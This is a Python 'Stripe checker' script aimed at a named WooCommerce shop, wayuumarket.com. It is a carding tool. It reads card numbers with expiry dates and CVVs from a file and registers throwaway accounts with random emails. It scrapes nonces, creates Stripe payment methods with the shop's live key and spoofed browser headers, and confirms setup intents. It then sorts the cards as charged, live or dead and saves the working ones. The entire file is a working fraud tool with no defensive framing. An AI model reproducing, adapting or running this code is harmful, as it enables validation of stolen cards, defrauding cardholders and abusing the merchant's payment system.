"""
WayuuMarket Stripe Checker v2.0 for Pydroid3
WooCommerce Add Payment Method Gate
"""

import requests
import random
import string
import uuid
import time
import os
import re

# ============ CONFIG ============
INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3
DEBUG = True
# ================================

def log(msg):
    if DEBUG:
        print(f"[DEBUG] {msg}")

def random_email():
    chars = string.ascii_lowercase + string.digits
    name = ''.join(random.choices(chars, k=10))
    return f"{name}@gmail.com"

def get_bin_info(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=10)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','?').upper()} | {d.get('bank',{}).get('name','?')} | {d.get('country',{}).get('name','?')}"
    except:
        pass
    return cc[:6]

def get_session_and_register():
    """Get session and register account"""
    
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
    })
    
    # Get registration page
    log("Getting registration page...")
    r = session.get('https://wayuumarket.com/my-account/', timeout=30)
    
    # Find register nonce
    nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
    if not nonce_match:
        nonce_match = re.search(r'woocommerce-register-nonce["\s]+value="([^"]+)"', r.text)
    
    if not nonce_match:
        log("No register nonce found")
        return None, None
    
    register_nonce = nonce_match.group(1)
    log(f"Register nonce: {register_nonce}")
    
    # Register
    email = random_email()
    log(f"Registering: {email}")
    
    data = {
        'email': email,
        'woocommerce-register-nonce': register_nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    r = session.post('https://wayuumarket.com/my-account/', data=data, timeout=30)
    
    if 'dashboard' in r.text.lower() or 'log out' in r.text.lower():
        log("Registration successful")
        return session, email
    
    log("Registration may have failed, trying anyway...")
    return session, email

def get_stripe_nonce(session):
    """Get nonce from add-payment-method page"""
    
    log("Getting add-payment-method page...")
    r = session.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
    html = r.text
    
    # Try multiple patterns for nonce
    patterns = [
        r'"createSetupIntentNonce"\s*:\s*"([^"]+)"',
        r'createSetupIntentNonce["\s:]+["\']([^"\']+)["\']',
        r'"nonce"\s*:\s*"([^"]+)".*?setup',
        r'wc_stripe_create_setup_intent.*?nonce.*?"([^"]+)"',
        r'"add_payment_method_nonce"\s*:\s*"([^"]+)"',
        r'_wpnonce=([a-f0-9]+)',
        r'name="_wpnonce"\s+value="([^"]+)"',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
        if match:
            nonce = match.group(1)
            log(f"Found nonce: {nonce[:20]}...")
            return nonce
    
    # Try to find any nonce in the stripe params
    stripe_params = re.search(r'wc_stripe_params\s*=\s*(\{[^;]+\})', html)
    if stripe_params:
        params_text = stripe_params.group(1)
        nonce_match = re.search(r'"([^"]*nonce[^"]*)":\s*"([^"]+)"', params_text, re.IGNORECASE)
        if nonce_match:
            log(f"Found nonce in stripe params: {nonce_match.group(2)[:20]}...")
            return nonce_match.group(2)
    
    log("No nonce found in page")
    return None

def create_payment_method(cc, mes, ano, cvv, email):
    """Create Stripe payment method"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    # WayuuMarket's Stripe key
    stripe_key = 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A'
    
    data = {
        'type': 'card',
        'billing_details[name]': 'John Doe',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796',
        'referrer': 'https://wayuumarket.com',
        'time_on_page': str(random.randint(50000, 150000)),
        'key': stripe_key,
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def confirm_setup_intent(session, pm_id, nonce):
    """Confirm setup intent via WooCommerce AJAX"""
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wayuumarket.com',
        'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'stripe_source_id': pm_id,
        'nonce': nonce,
    }
    
    log(f"Confirming setup intent with PM: {pm_id[:20]}...")
    
    try:
        r = session.post(
            'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
            headers=headers,
            data=data,
            timeout=30
        )
        log(f"Setup intent response: {r.text[:200]}")
        return r.json()
    except Exception as e:
        return {'error': str(e)}

def parse_response(pm_resp, setup_resp=None):
    """Parse responses"""
    
    # PM creation error
    if 'error' in pm_resp:
        err = pm_resp['error']
        code = err.get('decline_code') or err.get('code', '')
        msg = err.get('message', '')
        
        ccn_codes = ['incorrect_cvc', 'insufficient_funds', 'lost_card', 'stolen_card',
                     'expired_card', 'generic_decline', 'do_not_honor', 'card_velocity_exceeded',
                     'invalid_cvc', 'security_code_incorrect']
        
        if code in ccn_codes:
            return 'CCN', code
        
        if 'invalid' in code.lower() or 'invalid' in msg.lower():
            return 'DEAD', code or msg
        
        return 'DEAD', code or msg
    
    # Setup intent response
    if setup_resp:
        if setup_resp.get('success') == True:
            return 'CHARGED', 'Card Added!'
        
        status = setup_resp.get('status', '')
        if status == 'succeeded':
            return 'CHARGED', 'Setup Succeeded!'
        
        if status == 'requires_action':
            return 'CCN', '3DS Required'
        
        error = setup_resp.get('error', '')
        if error:
            if isinstance(error, dict):
                error = error.get('message', str(error))
            
            error_lower = str(error).lower()
            
            if any(x in error_lower for x in ['cvc', 'security', 'insufficient', 'generic_decline', 'lost', 'stolen']):
                return 'CCN', str(error)[:40]
            
            if 'authentication' in error_lower or '3d' in error_lower:
                return 'CCN', '3DS Required'
            
            return 'DEAD', str(error)[:40]
    
    # PM created successfully
    if pm_resp.get('id', '').startswith('pm_'):
        card = pm_resp.get('card', {})
        brand = card.get('brand', 'unknown').upper()
        return 'LIVE', f'PM Created ({brand})'
    
    return 'DEAD', 'Unknown'

def check_card(cc, mes, ano, cvv):
    """Full check flow"""
    
    # Step 1: Get session and register
    session, email = get_session_and_register()
    if not session:
        return 'ERROR', 'Session failed'
    
    # Step 2: Get nonce
    nonce = get_stripe_nonce(session)
    if not nonce:
        # Try without nonce - just PM creation
        log("No nonce, trying PM creation only...")
        pm_resp = create_payment_method(cc, mes, ano, cvv, email)
        return parse_response(pm_resp)
    
    # Step 3: Create PM
    log(f"Creating PM for {cc[:6]}...")
    pm_resp = create_payment_method(cc, mes, ano, cvv, email)
    
    if 'error' in pm_resp:
        return parse_response(pm_resp)
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    log(f"PM created: {pm_id}")
    
    # Step 4: Confirm setup intent
    setup_resp = confirm_setup_intent(session, pm_id, nonce)
    
    return parse_response(pm_resp, setup_resp)

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET STRIPE CHECKER v2.0    ║
    ║           FOR PYDROID3                ║
    ║     WooCommerce Setup Intent Gate     ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("[!] No cards")
        return
    
    print(f"[*] Cards: {len(cards)}")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 45)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        if len(parts) < 4:
            continue
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}...{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            stats['charged'] += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CHARGED\n")
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            stats['ccn'] += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin_info(cc)}")
            stats['live'] += 1
            with open(LIVE_FILE, 'a') as f:
                f.write(f"{full}|LIVE\n")
        elif status == 'ERROR':
            print(f"[ERROR] {msg}")
            stats['error'] += 1
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            with open(DEAD_FILE, 'a') as f:
                f.write(f"{full}|{msg}\n")
        
        print(f"[*] {t}s")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 45)
    print(f"CHARGED: {stats['charged']} | CCN: {stats['ccn']} | LIVE: {stats['live']} | DEAD: {stats['dead']}")

if __name__ == "__main__":
    main()
